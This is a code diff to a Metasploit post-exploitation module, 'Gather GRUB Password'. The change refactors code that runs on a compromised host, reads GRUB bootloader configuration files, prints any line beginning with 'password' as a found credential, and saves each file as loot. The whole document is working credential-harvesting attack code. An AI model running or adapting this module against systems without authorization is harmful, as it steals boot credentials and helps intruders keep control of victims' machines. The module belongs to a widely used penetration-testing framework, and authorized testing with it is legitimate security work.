@@ -9,9 +9,9 @@ class MetasploitModule < Msf::Post
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'         => '*nix Gather Grub Password',
+      'Name'         => 'Gather GRUB Password',
       'Description'  => %q{
-        This module gathers grub passwords from grub bootloader config file.
+        This module gathers GRUB passwords from GRUB bootloader config files.
       },
       'License'      => MSF_LICENSE,
       'Author'       =>
@@ -39,23 +39,23 @@ class MetasploitModule < Msf::Post
     ]
 
     targets.each do |target|
-      if file? target
-        print_status("Reading #{target}")
-        file = read_file(target)
-        lines = file.split("\n")
-        found = false
-        lines.each do |line|
-          line = line.strip
-          if line.start_with?("password")
-            print_line(line)
-            found = true
-          end
-        end
-
-        if !found
-          print_status("No password found in config file")
+      next unless file?(target) and readable?(target)
+      print_status("Reading #{target}")
+      file = read_file(target)
+      found = false
+      file.each_line do |line|
+        line = line.strip
+        if line.start_with?("password")
+          print_good("Found password: #{line}")
+          found = true
         end
       end
+
+      if !found
+        print_status("No passwords found in GRUB config file: #{target}")
+      end
+      file_loc = store_loot("#{target}", "text/plain", session, file)
+      print_good("#{target} saved to #{file_loc}")
     end
   end
 end
